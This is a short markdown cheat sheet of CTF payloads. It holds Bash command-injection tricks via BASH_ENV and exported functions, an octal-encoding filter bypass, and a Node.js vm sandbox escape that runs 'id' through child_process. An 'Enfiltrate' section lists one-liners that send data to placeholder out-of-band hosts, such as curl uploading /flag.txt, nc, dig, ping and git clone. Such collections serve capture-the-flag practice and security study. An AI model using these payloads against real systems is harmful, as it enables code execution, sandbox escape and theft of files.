# magic_strings
Handy bits for CTFs and life

### Bash 

#### ENV Vars
    BASH_ENV='$(id 1>&2)' bash -c 'echo hello'

    env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'

#### Encoding

    $'\151\144'

### NodeJS

#### Node VM

Escape Node VM Sandbox

    const process = this.constructor.constructor("return this.process")();
    output=process.mainModule.require("child_process").execSync("id").toString()

### Enfiltrate

    curl -T /flag.txt xxxx.interct.sh
    ping here.xxx.interact.sh
    nc nchere.xxx.interact.sh 80
    dig dighere.xxx.interact.sh
    git clone githere.xxx.interact.sh
    

## Resources

- [Payloads All The Things]( https://github.com/swisskyrepo/PayloadsAllTheThings/ )
